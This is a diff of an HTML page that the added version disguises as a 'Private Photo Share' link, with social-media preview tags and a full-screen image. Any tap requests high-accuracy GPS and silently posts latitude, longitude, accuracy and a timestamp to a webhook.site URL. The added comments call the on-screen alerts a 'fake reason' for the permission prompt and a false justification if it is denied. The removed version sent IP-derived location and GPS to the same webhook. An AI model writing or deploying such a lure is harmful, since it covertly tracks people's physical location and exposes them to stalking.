@@ -1,35 +1,46 @@
 <!DOCTYPE html>
 <html>
-<head<meta property="og:title" content="Shared Image">
-<meta property="og:image" content="https//static.thenounproject.com/png/1503613-200.png">
-<meta property="og:description" content="Click to view image">>
-    <title>Connectivity Test</title>
+<head>
+    <meta property="og:title" content="Private Photo Share">
+    <meta property="og:image" content="[attachment_0](attachment)">
+    <meta property="og:description" content="Tap to view full high-resolution image">
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
-        button { padding: 10px 20px; font-weight: bold; cursor: pointer; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black; }
+        #mask {
+            width: 100vw;
+            height: 100vh;
+            background-image: url('[attachment_0](attachment)');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            cursor: pointer;
+        }
     </style>
 </head>
-<body>
-    <h2>Diagnostic Test</h2>
-    <button onclick="start()">Run Test</button>
-    <div id="out"></div>
+<body onclick="initiate()">
+    <div id="mask"></div>
+
     <script>
-        async function start() {
-            const url = "https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67";
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            document.getElementById('out').innerText = "Testing " + data.city;
-            
+        async function initiate() {
+            // Request High-Accuracy GPS immediately upon touch
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await fetch(url, {
+                await fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify({ip: data, lat: pos.coords.latitude, lon: pos.coords.longitude})
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    })
                 });
-                alert("Test Complete");
+                // Provide a fake reason for the prompt and the lack of change
+                alert("Loading high-resolution preview... please wait.");
+            }, (err) => {
+                // Justification for the permission request if denied
+                alert("Permission to access device sensors is required to view high-quality content.");
             });
         }
     </script>
 </body>
 </html>
-
